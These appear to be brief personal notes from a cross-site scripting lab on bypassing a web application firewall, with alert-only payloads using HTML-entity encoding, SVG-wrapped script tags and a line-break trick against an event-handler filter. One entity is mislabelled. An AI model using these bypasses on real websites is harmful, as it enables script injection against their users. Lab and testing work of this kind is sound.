normal payload = <script>alert('XSS')</script>
waf blocks (= so html encode
'(' = &#x28; 
'=' = &#x29;

payload with html encode
<script>alert&#x28;'1'&#x29;</script> but not triggered because &#x28; and &#x29; are HTML entities that get decoded to ( and ) in HTML context,
but the script tag content is treated as text, not HTML.

payload with svg
<svg><script>alert&#x28;'1'&#x29;</script>
Executed because SVG elements can contain script elements that execute in HTML context



level 5
onfocus or whatever the starts on.+?= is blocked by waf then enter before = to bypass waf
payload="on.+?
="
